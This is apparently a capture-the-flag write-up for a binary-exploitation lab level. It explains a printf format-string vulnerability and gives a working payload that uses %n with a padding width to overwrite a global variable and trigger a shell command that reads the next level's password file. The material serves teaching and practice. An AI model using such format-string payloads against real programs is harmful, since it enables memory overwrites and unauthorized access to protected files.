# LEVEL 4

## 💡 Explanation

In this level we have to:
1. As always, have a look at the disas main, and the function `n` which is called on it. This fucntion looks pretty similar to what we had in the last exersise: it calls to `fget` and to `printf` passing the buffer (it does this inside of the function `p` this time), then there's a compare of the variable `m` to "0x1025544" and if true it calls to `system("/bin/cat /home/user/level5/.pass")`; there is where we want to get!
2. The idea now is that we have to use the call to `printf` to set the value of the variable `m` to "0x1025544" (16930116 in dec) which is too long to use the same exploit as before... What we are going to take profil of is the printf padding formatting. Having a number in the middle of a format specifier determines how much padding should be printed with the variable.
3. Now we are going to build our exploit. It should look like: [ADDRESS M][PADDING][%N FORMATTER]. /!\ The padding will be the lenght we are expecting - the 4 byted used to write the address of `m`!

## 👾 Commands

To find the solution:
```
[GDB] b *0x0804848d => set a breakpoint right after the printf
[GDB] run < <(python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"')
```

To execute the solution:
- `(python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' ; cat - ) | /home/user/level4/level4`

## 🔍 Resources

- [How to Write Specific Values to Memory with Format String Exploitation](https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/)
